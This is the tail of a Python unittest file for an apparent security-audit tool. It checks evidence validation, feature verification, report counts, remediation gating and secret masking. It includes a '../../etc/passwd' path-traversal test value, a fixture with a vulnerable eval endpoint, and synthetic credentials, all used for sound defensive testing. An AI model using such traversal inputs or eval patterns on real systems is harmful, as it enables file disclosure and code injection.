                "verification": {"method": "static-pattern", "status": "Pending", "notes": ""}}

    def errors(self, f):
        return fnd.validate_finding(f, self.td, {})[0]

    def assertRejected(self, f, fragment):
        errs = self.errors(f)
        self.assertTrue(any(fragment in e for e in errs), errs)

    def test_exact_line_match_passes(self):
        self.assertEqual(self.errors(self.finding([{"file": "m.py", "line": 2}], "b = 2")), [])

    def test_multiline_range_passes_with_whitespace_normalisation(self):
        loc = [{"file": "m.py", "line": 3, "end_line": 6}]
        self.assertEqual(self.errors(self.finding(loc, "result = compute(\n    alpha,\n    beta,\n)")), [])
        self.assertEqual(self.errors(self.finding(loc, "result = compute( alpha, beta, )")), [])

    def test_snippet_elsewhere_in_same_file_fails(self):
        self.assertRejected(self.finding([{"file": "m.py", "line": 2}], "c = 3"), "possible fabricated evidence")

    def test_snippet_running_past_range_end_fails(self):
        self.assertRejected(self.finding([{"file": "m.py", "line": 3, "end_line": 4}], "alpha, beta,"), "possible fabricated evidence")

    def test_out_of_range_line_fails(self):
        self.assertRejected(self.finding([{"file": "m.py", "line": 99}], "b = 2"), "out of range")
        self.assertRejected(self.finding([{"file": "m.py", "line": 2, "end_line": 99}], "b = 2"), "out of range")

    def test_invalid_line_values_fail(self):
        for bad in (0, -1, "x", True, 2.0):
            self.assertRejected(self.finding([{"file": "m.py", "line": bad}], "b = 2"), "positive integer")

    def test_inverted_range_fails(self):
        self.assertRejected(self.finding([{"file": "m.py", "line": 5, "end_line": 3}], "beta,"), "precedes")

    def test_end_line_without_line_fails(self):
        self.assertRejected(self.finding([{"file": "m.py", "end_line": 3}], "a = 1"), "without 'line'")

    def test_missing_file_and_escaping_path_fail(self):
        self.assertRejected(self.finding([{"file": "nope.py", "line": 1}], "x"), "does not exist")
        self.assertRejected(self.finding([{"file": "../m.py", "line": 1}], "a = 1"), "relative")

    def test_multiple_locations_need_a_match_in_at_least_one(self):
        locs = [{"file": "m.py", "line": 1}, {"file": "m.py", "line": 7}]
        self.assertEqual(self.errors(self.finding(locs, "c = 3")), [])
        self.assertRejected(self.finding(locs, "b = 2"), "possible fabricated evidence")

    def test_file_level_and_project_level_findings_keep_their_rules(self):
        self.assertEqual(self.errors(self.finding([{"file": "m.py"}], "c = 3")), [])  # file named, no line: whole file
        self.assertEqual(self.errors(self.finding([], "anything")), [])  # project-level: nothing to match

    def test_masked_evidence_is_checked_against_the_masked_range_not_by_equality(self):
        secret = synthetic()["token"]
        (self.td / "k.py").write_text(f'x = 1\nTOKEN = "{secret}"\n')
        masked_line = sm.mask_text(f'TOKEN = "{secret}"')[0]
        self.assertNotIn(secret, masked_line)
        ok = self.finding([{"file": "k.py", "line": 2}], masked_line, masked=True)
        self.assertEqual(self.errors(ok), [])
        self.assertEqual(fnd.validate_finding_ex(ok, self.td, {})[2]["snippet_check"], "masked-range-match")
        self.assertRejected(self.finding([{"file": "k.py", "line": 1}], masked_line, masked=True), "possible fabricated evidence")
        self.assertRejected(self.finding([{"file": "k.py", "line": 2}], masked_line, masked=False), "possible fabricated evidence")


# ----------------------------------------------------------------------------- B. feature verification

class TestFeatureVerification(unittest.TestCase):
    def setUp(self):
        self.ws = Path(tempfile.mkdtemp())
        (self.ws / "runs").mkdir()

    def tearDown(self):
        common.rmtree_force(self.ws)

    def run_record(self, ref="r1", drop=(), **over):
        rec = {"verdict": "executed", "exit_code": 0, "timed_out": False, "command": "python3 -m pytest -q"}
        rec.update(over)
        for k in drop:
            rec.pop(k)
        (self.ws / "runs" / f"{ref}.json").write_text(json.dumps(rec))

    def feature(self, drop=(), **over):
        ft = {"feature": "Checkout", "result": "Verified Working", "method": "executed-test", "run_ref": "r1",
              "verification": "POST /api/order returns 200 and the order row exists"}
        ft.update(over)
        for k in drop:
            ft.pop(k)
        return ft

    def errors(self, ft):
        return gr.validate_features([ft], self.ws)

    def assertRejected(self, ft, fragment):
        errs = self.errors(ft)
        self.assertTrue(any(fragment in e for e in errs), errs)

    def test_successful_run_passes_and_record_is_not_rewritten(self):
        self.run_record()
        ft = self.feature()
        self.assertEqual(self.errors(ft), [])
        self.assertEqual(ft, self.feature())

    def test_nonzero_exit_code_cannot_be_verified_working(self):
        self.run_record(exit_code=1)
        self.assertRejected(self.feature(), "exit code is 1")

    def test_timed_out_run_cannot_be_verified_working(self):
        self.run_record(exit_code=-9, timed_out=True)
        self.assertRejected(self.feature(), "timed out")

    def test_missing_timed_out_flag_is_rejected(self):
        self.run_record(drop=("timed_out",))
        self.assertRejected(self.feature(), "timed_out=false")

    def test_missing_or_null_exit_code_is_rejected(self):
        self.run_record(drop=("exit_code",))
        self.assertRejected(self.feature(), "exit code")
        self.run_record(exit_code=None)
        self.assertRejected(self.feature(), "exit code")

    def test_missing_unknown_or_escaping_run_reference_is_rejected(self):
        self.run_record()
        self.assertRejected(self.feature(drop=("run_ref",)), "run_ref")
        self.assertRejected(self.feature(run_ref="ghost"), "does not exist")
        self.assertRejected(self.feature(run_ref="../../etc/passwd"), "does not exist")

    def test_refused_execution_is_rejected(self):
        self.run_record(verdict="refused", reason="no isolation", drop=("exit_code", "timed_out"))
        self.assertRejected(self.feature(), "refused")

    def test_incorrect_method_is_rejected(self):
        self.run_record()
        self.assertRejected(self.feature(method="manual-code-read"), "method")

    def test_missing_verification_description_is_rejected(self):
        self.run_record()
        self.assertRejected(self.feature(drop=("verification",)), "verification")
        self.assertRejected(self.feature(verification="   "), "verification")

    def test_other_results_are_not_subject_to_the_execution_rules(self):
        self.assertEqual(self.errors({"feature": "X", "result": "Not Verified"}), [])


# ----------------------------------------------------------------------------- shared fixture for CLI-level tests

class Phase1Base(Base):
    def setUp(self):
        self.w = self.tmp / f"ws_p1_{os.urandom(3).hex()}"
        shutil.copytree(self.ws, self.w, symlinks=True)
        common.make_writable(self.w)
        common.make_readonly(self.w / "source")

    def fid(self, rule, ws=None):
        return next(f["id"] for f in load((ws or self.w) / "findings.json")["findings"] if f["source"]["rule_id"] == rule)

    def add_manual(self, ws=None, item=None):
        ws = ws or self.w
        p = self.tmp / f"manual_{os.urandom(3).hex()}.json"
        p.write_text(json.dumps(item or MANUAL))
        r = run("findings.py", "--workspace", ws, "add", "--json", p)
        ids = [f["id"] for f in load(ws / "findings.json")["findings"] if f["fingerprint"].startswith("manual-")]
        return r, (ids[-1] if ids else None)


# ----------------------------------------------------------------------------- C. report consistency

class TestReportConsistency(Phase1Base):
    def test_compute_totals_separates_active_and_dismissed(self):
        fs = [{"severity": "Critical", "status": "Confirmed"}, {"severity": "High", "status": "Potential"},
              {"severity": "Low", "status": "Not Applicable"}, {"severity": "Critical", "status": "Potential"}]
        t = gr.compute_totals(fs)
        self.assertEqual((t["total"], t["active"], t["dismissed"]), (4, 3, 1))
        self.assertEqual((t["by_severity"]["Critical"], t["by_severity"]["Low"]), (2, 0))
        self.assertEqual(t["by_status"]["Not Applicable"], 1)

    def test_all_three_formats_show_identical_calculated_counts(self):
        run("findings.py", "--workspace", self.w, "update", self.fid("PY-EVAL"), "--status", "Not Applicable", "--notes", "eval of a constant", check=True)
        run("generate_report.py", "--workspace", self.w, check=True)
        fs = load(self.w / "findings.json")["findings"]
        total, dismissed = len(fs), sum(1 for f in fs if f["status"] == "Not Applicable")
        active = total - dismissed
        self.assertGreaterEqual(dismissed, 1)
        rep = self.w / "reports"
        t = load(rep / "aisa-report.json")["totals"]
        self.assertEqual((t["total"], t["active"], t["dismissed"]), (total, active, dismissed))
        md, page = (rep / "aisa-report.md").read_text(), (rep / "aisa-report.html").read_text()
        for label, n in (("Findings: total (incl. dismissed)", total), ("Findings: active (excl. dismissed)", active), ("Findings: dismissed", dismissed)):
            self.assertIn(f"| {label} | {n} |", md)
            self.assertIn(f"<td>{label}</td><td>{n}</td>", page)

    def test_correct_narrative_total_is_accepted(self):
        total = len(load(self.w / "findings.json")["findings"])
        (self.w / "narrative.json").write_text(json.dumps({"executive_summary": f"AISA found {total} total findings."}))
        run("generate_report.py", "--workspace", self.w, check=True)

    def test_wrong_narrative_total_blocks_report_and_names_the_authoritative_value(self):
        total = len(load(self.w / "findings.json")["findings"])
        (self.w / "narrative.json").write_text(json.dumps({"executive_summary": "AISA found 9999 total findings."}))
        r = run("generate_report.py", "--workspace", self.w)
        self.assertEqual(r.returncode, 3)
        self.assertIn("9999", r.stdout)
        self.assertIn(f"total={total}", r.stdout)
        self.assertIn("authoritative", r.stdout)
        self.assertFalse((self.w / "reports" / "aisa-report.md").exists())

    def test_allow_invalid_renders_but_keeps_errors_visible_everywhere(self):
        (self.w / "narrative.json").write_text(json.dumps({"executive_summary": "AISA found 9999 total findings."}))
        run("generate_report.py", "--workspace", self.w, "--allow-invalid", check=True)
        rep = self.w / "reports"
        self.assertIn("VALIDATION ERRORS", (rep / "aisa-report.md").read_text())
        self.assertIn("9999", (rep / "aisa-report.md").read_text())
        self.assertIn("9999", (rep / "aisa-report.html").read_text())
        self.assertTrue(any("9999" in e for e in load(rep / "aisa-report.json")["validation_errors"]))

    def test_narrative_text_claim_rules(self):
        t = gr.compute_totals([{"severity": "Critical", "status": "Confirmed"}, {"severity": "Critical", "status": "Potential"},
                               {"severity": "High", "status": "Potential"}, {"severity": "Low", "status": "Not Applicable"}])
        ok = "4 total findings; 1 finding was dismissed; 2 critical findings; 1 confirmed critical finding; 3 active findings."
        self.assertEqual(gr.validate_narrative_counts({"executive_summary": ok}, t), [])
        for wrong in ("3 critical findings", "2 confirmed critical findings", "5 active findings", "2 dismissed"):
            self.assertTrue(gr.validate_narrative_counts({"x": [wrong]}, t), wrong)
        self.assertEqual(gr.validate_narrative_counts({"x": "4 findings in SEC"}, t), [])  # unqualified: not attributable
        self.assertEqual(len(gr.validate_narrative_counts({"counts": {"total": 9, "by_severity": {"Critical": 7, "Nope": 1}}}, t)), 3)


# ----------------------------------------------------------------------------- D. remediation gating

class TestRemediationGating(Phase1Base):
    def prepare(self, extra_ids=()):
        ev = self.fid("PY-EVAL")
        run("remediation.py", "--workspace", self.w, "approve", "--ids", ",".join([ev, *extra_ids]), "--statement", "user: fix these", check=True)
        run("remediation.py", "--workspace", self.w, "init", check=True)
        t = self.w / "remediation" / "work" / "backend" / "app.py"
        t.write_text(t.read_text().replace('jsonify({"result": eval(expr)})', 'jsonify({"result": float(expr)})'))
        run("remediation.py", "--workspace", self.w, "record", "--id", ev, "--files", "backend/app.py", "--description", "removed eval", check=True)
        run("remediation.py", "--workspace", self.w, "diff", check=True)
        return ev

    def validate(self, *extra):
        r = run("remediation.py", "--workspace", self.w, "validate", *extra)
        return r, load(self.w / "remediation" / "validation.json")

    @staticmethod
    def codes(val):
        return {x["code"] for x in val["reasons"]}

    def write_records(self, records):
        (self.w / "remediation" / "manual_verification.json").write_text(json.dumps({"results": records}))

    def checkout_copy(self):
        copy = self.tmp / f"checkout_{os.urandom(3).hex()}"
        shutil.copytree(FIXTURE, copy)
        return copy

    def test_pending_manual_finding_fails_and_blocks_apply(self):
        r, mid = self.add_manual()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.prepare()
        v, val = self.validate()
        self.assertEqual((v.returncode, val["verdict"]), (1, "FAIL"))
        self.assertIn("MANUAL_PENDING", self.codes(val))
        self.assertIn(mid, val["before_after"]["manual_findings_needing_reverification"])
        self.assertTrue(val["unverified"])
        copy = self.checkout_copy()
        a = run("remediation.py", "--workspace", self.w, "apply-to", "--target", copy, "--confirm")
        self.assertNotEqual(a.returncode, 0)
        self.assertIn("validation has not passed", a.stderr)
        self.assertIn("eval(expr)", (copy / "backend" / "app.py").read_text())

    def test_valid_resolved_record_satisfies_the_requirement_and_apply_still_needs_confirm(self):
        _, mid = self.add_manual()
        self.prepare()
        run("remediation.py", "--workspace", self.w, "verify-manual", "--id", mid, "--result", "resolved",
            "--notes", "Re-read validate_cart after the change; the swallowed-exception path is gone", check=True)
        v, val = self.validate()
        self.assertEqual((v.returncode, val["verdict"], val["reasons"]), (0, "PASS", []))
        self.assertIn(mid, val["before_after"]["resolved"])
        copy = self.checkout_copy()
        self.assertNotEqual(run("remediation.py", "--workspace", self.w, "apply-to", "--target", copy).returncode, 0)  # --confirm still required
        run("remediation.py", "--workspace", self.w, "apply-to", "--target", copy, "--confirm", check=True)
        self.assertNotIn("eval(expr)", (copy / "backend" / "app.py").read_text())

    def test_invalid_manual_records_fail(self):
        _, mid = self.add_manual()
        self.prepare()
        for rec in ({"id": mid, "result": "fixed", "notes": "x"}, {"id": mid, "result": "resolved", "notes": "  "},
                    {"id": "AISA-ZZZ-999", "result": "resolved", "notes": "x"}):
            self.write_records([rec])
            v, val = self.validate()
            self.assertEqual((v.returncode, val["verdict"]), (1, "FAIL"), rec)
            self.assertIn("MANUAL_INVALID", self.codes(val), rec)
            self.assertNotIn(mid, val["before_after"]["resolved"])

    def test_verify_manual_rejects_unknown_id_and_empty_notes(self):
        self.prepare()
        r = run("remediation.py", "--workspace", self.w, "verify-manual", "--id", "AISA-ZZZ-999", "--result", "resolved", "--notes", "x")
        self.assertNotEqual(r.returncode, 0)
        r = run("remediation.py", "--workspace", self.w, "verify-manual", "--id", self.fid("PY-EVAL"), "--result", "resolved", "--notes", " ")
        self.assertNotEqual(r.returncode, 0)

    def test_persisting_record_never_counts_as_resolved(self):
        _, mid = self.add_manual()
        self.prepare()
        run("remediation.py", "--workspace", self.w, "verify-manual", "--id", mid, "--result", "persisting",
            "--notes", "Re-read validate_cart; the bare except is still there", check=True)
        _, val = self.validate()
        self.assertIn(mid, val["before_after"]["persisting"])
        self.assertNotIn(mid, val["before_after"]["resolved"])

    def test_claimed_fixed_but_manually_persisting_fails(self):
        _, mid = self.add_manual()
        self.prepare(extra_ids=(mid,))
        run("remediation.py", "--workspace", self.w, "record", "--id", mid, "--files", "backend/app.py", "--description", "attempted fix", check=True)
        run("remediation.py", "--workspace", self.w, "verify-manual", "--id", mid, "--result", "persisting", "--notes", "still present after the change", check=True)
        v, val = self.validate()
        self.assertEqual((v.returncode, val["verdict"]), (1, "FAIL"))
        self.assertIn("CLAIMED_FIXED_STILL_DETECTED", self.codes(val))

    def test_syntax_failure_fails(self):
        self.prepare()
        t = self.w / "remediation" / "work" / "backend" / "app.py"
        t.write_text(t.read_text() + "\ndef broken(:\n")
        v, val = self.validate()
        self.assertEqual((v.returncode, val["verdict"]), (1, "FAIL"))
        self.assertIn("SYNTAX_FAILED", self.codes(val))

    def test_apply_refuses_legacy_or_stale_validation(self):
        self.prepare()
        copy = self.checkout_copy()
        (self.w / "remediation" / "validation.json").write_text(json.dumps({"verdict": "PASS"}))  # pre-Phase-1 shape
        a = run("remediation.py", "--workspace", self.w, "apply-to", "--target", copy, "--confirm")
        self.assertNotEqual(a.returncode, 0)
        self.assertIn("re-run", a.stderr)
        self.assertIn("eval(expr)", (copy / "backend" / "app.py").read_text())
        v, val = self.validate()  # fixture has no tests, so this is a genuine PASS ...
        self.assertEqual(val["verdict"], "PASS", val["reasons"])
        (self.w / "remediation" / "work" / "backend" / "app.py").write_text("print('changed after validation')\n")
        a = run("remediation.py", "--workspace", self.w, "apply-to", "--target", copy, "--confirm")  # ... until the work copy changes
        self.assertNotEqual(a.returncode, 0)
        self.assertIn("changed after validation", a.stderr)

    def test_unit_evaluate_manual_classification(self):
        man, known = {"m1": {"id": "M1"}, "m2": {"id": "M2"}}, {"M1", "M2"}
        self.assertEqual(rem.evaluate_manual(man, [], known)["pending"], ["M1", "M2"])
        r = rem.evaluate_manual(man, [{"id": "M1", "result": "resolved", "notes": "re-read"}, {"id": "M2", "result": "persisting", "notes": "still"}], known)
        self.assertEqual((r["resolved"], r["persisting"], r["pending"], r["invalid"], r["problems"]), (["M1"], ["M2"], [], [], []))
        self.assertEqual(rem.evaluate_manual(man, [{"id": "M1", "result": "resolved", "notes": "a"}, {"id": "M1", "result": "persisting", "notes": "b"}], known)["invalid"], ["M1"])

    def test_test_regression_and_unverified_tests(self):
        proj = self.tmp / f"tp_{os.urandom(3).hex()}"
        proj.mkdir()
        (proj / "m.py").write_text("def add(a, b):\n    return a + b\n")
        (proj / "test_m.py").write_text("import unittest, m\nclass T(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(m.add(1, 2), 3)\n")
        ws = self.tmp / f"ws_tp_{os.urandom(3).hex()}"
        run("intake.py", "--workspace", ws, "--path", proj, check=True)
        run("run_scans.py", "--workspace", ws, check=True)
        item = {**MANUAL, "locations": [{"file": "m.py", "line": 2}], "evidence": {"snippet": "return a + b"},
                "verification": {"method": "manual-code-read", "notes": "Read m.add"}}
        _, mid = self.add_manual(ws, item)
        run("remediation.py", "--workspace", ws, "approve", "--ids", mid, "--statement", "user: fix", check=True)
        run("remediation.py", "--workspace", ws, "init", check=True)
        work = ws / "remediation" / "work" / "m.py"
        work.write_text(work.read_text().replace("a + b", "a - b"))
        run("remediation.py", "--workspace", ws, "record", "--id", mid, "--files", "m.py", "--description", "changed add", check=True)
        v = run("remediation.py", "--workspace", ws, "validate")  # a test suite exists but no --test-command: unverified, never PASS
        val = load(ws / "remediation" / "validation.json")
        self.assertEqual((v.returncode, val["verdict"]), (1, "FAIL"))
        self.assertIn("TESTS_UNVERIFIED", {x["code"] for x in val["reasons"]})
        v = run("remediation.py", "--workspace", ws, "validate", "--test-command", "python3 -m unittest -v", "--accept-no-isolation")
        val = load(ws / "remediation" / "validation.json")
        self.assertEqual(v.returncode, 1)
        self.assertIn("TEST_REGRESSION", {x["code"] for x in val["reasons"]})


# ----------------------------------------------------------------------------- E. secret masking

class TestSecretMaskingUnits(NoLeak, unittest.TestCase):
    def test_provider_style_token_is_masked_and_context_survives(self):
        out, changed = sm.mask_text(f"leaked {synthetic()['token']} in config")
        self.assertNoLeak(out, "masked provider token")
        self.assertTrue(changed)
        self.assertTrue(out.startswith("leaked ") and out.endswith(" in config"))

    def test_generic_password_assignments(self):
        for text in (f'password = "{synthetic()["password"]}"', f"DB_PASSWORD={synthetic()['password']}",
                     f"the password is {synthetic()['password']} for admin"):
            out, changed = sm.mask_text(text)
            self.assertTrue(changed, "assignment not masked")
            self.assertNoLeak(out, "masked password assignment")

    def test_database_connection_string(self):
        out, changed = sm.mask_text(f"postgres://svc_user:{synthetic()['dsn_password']}@db.internal/app")
        self.assertTrue(changed and "db.internal" in out and "svc_user" in out)
        self.assertNoLeak(out, "masked connection string")

    def test_secret_repeated_bare_elsewhere_in_the_same_item_is_masked_too(self):
        pw = synthetic()["password"]
        out, changed = sm.mask_value({"explanation": f'password: "{pw}"', "impact": f"attacker reuses {pw} elsewhere", "title": "Order total never validated"})
        self.assertTrue(changed)
        self.assertNoLeak(json.dumps(out), "propagated masking")
        self.assertEqual(out["title"], "Order total never validated")

    def test_ordinary_prose_and_code_stay_readable(self):
        for text in ("The token is validated before use; password policy requires 12 chars", 'password = request.form["pw"]',
                     "password: ${DB_PASSWORD}", "No credentials here."):
            self.assertEqual(sm.mask_text(text), (text, False), text)

    def test_masking_is_idempotent(self):
        once = sm.mask_text(f'password = "{synthetic()["password"]}" {synthetic()["token"]}')[0]
        self.assertEqual(sm.mask_text(once), (once, False))

    def test_private_key_block_is_masked_entirely(self):
        out, changed = sm.mask_text("k:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEabc123\n-----END RSA PRIVATE KEY-----")
        self.assertTrue(changed and "MIIEabc123" not in out)


class TestManualFindingSecretMasking(NoLeak, Phase1Base):
    def secret_item(self):
        s = synthetic()
        return {"domain": "SEC", "title": f"Hard-coded token {s['token']} in config", "severity": "High", "status": "Potential",
                "locations": [{"file": "backend/app.py", "line": 12}],
                "evidence": {"snippet": f'STRIPE_KEY = "{RUNTIME_SECRET}"', "details": f"password={s['password']} is also set"},
                "explanation": f'The service reads password: "{s["password"]}" at start-up.',
                "impact": f"Anyone can connect to postgres://svc:{s['dsn_password']}@db.internal/app.",
                "recommendation": f"Rotate {s['token']} and move it to a secret manager.",
                "references": [f"see {s['token']}"],
                "verification": {"method": "manual-code-read", "notes": f'token: "{s["token"]}" was read from the config file'}}

    def test_manual_add_masks_every_field_before_persistence_and_in_all_reports(self):
        r, fid = self.add_manual(item=self.secret_item())
        self.assertEqual(r.returncode, 0, "add failed")
        extra = {"runtime": RUNTIME_SECRET}
        self.assertNoLeak(r.stdout + r.stderr, "add output", extra)
        stored = (self.w / "findings.json").read_text()
        self.assertNoLeak(stored, "findings.json", extra)
        f = next(x for x in load(self.w / "findings.json")["findings"] if x["id"] == fid)
        self.assertTrue(f["evidence"]["masked"])
        self.assertEqual(f["evidence"]["masking"], {"method": "secret_mask.mask_text", "snippet_check": "masked-range-match"})
        self.assertTrue(f["title"].startswith("Hard-coded token ") and f["title"].endswith(" in config"))  # readable context
        self.assertEqual((f["status"], f["verification"]["status"]), ("Potential", "Pending"))  # masking never confirms anything
        run("generate_report.py", "--workspace", self.w, check=True)
        for name in ("aisa-report.md", "aisa-report.html", "aisa-report.json"):
            self.assertNoLeak((self.w / "reports" / name).read_text(), name, extra)
        self.assertIn("MASKED excerpt", (self.w / "reports" / "aisa-report.md").read_text())

    def test_masked_snippet_on_the_wrong_line_is_rejected_without_echoing_the_secret(self):
        item = self.secret_item()
        item["locations"] = [{"file": "backend/app.py", "line": 13}]
        r, _ = self.add_manual(item=item)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("possible fabricated evidence", r.stderr)
        self.assertNoLeak(r.stdout + r.stderr, "rejection output", {"runtime": RUNTIME_SECRET})

    def test_update_masks_notes_and_snippet(self):
        _, fid = self.add_manual(item=self.secret_item())
        r = run("findings.py", "--workspace", self.w, "update", fid, "--notes", f"checked: password={synthetic()['password']}")
        self.assertEqual(r.returncode, 0, "update failed")
        self.assertNoLeak(r.stdout + r.stderr + (self.w / "findings.json").read_text(), "update path", {"runtime": RUNTIME_SECRET})

    def test_manual_verification_notes_are_masked(self):
        ev = self.fid("PY-EVAL")
        run("remediation.py", "--workspace", self.w, "approve", "--ids", ev, "--statement", "user: fix eval", check=True)
        r = run("remediation.py", "--workspace", self.w, "verify-manual", "--id", ev, "--result", "persisting",
                "--notes", f"password: {synthetic()['password']} is still in the config")
        self.assertEqual(r.returncode, 0, "verify-manual failed")
        self.assertNoLeak(r.stdout + r.stderr + (self.w / "remediation" / "manual_verification.json").read_text(), "verify-manual")


if __name__ == "__main__":
    unittest.main(verbosity=2)
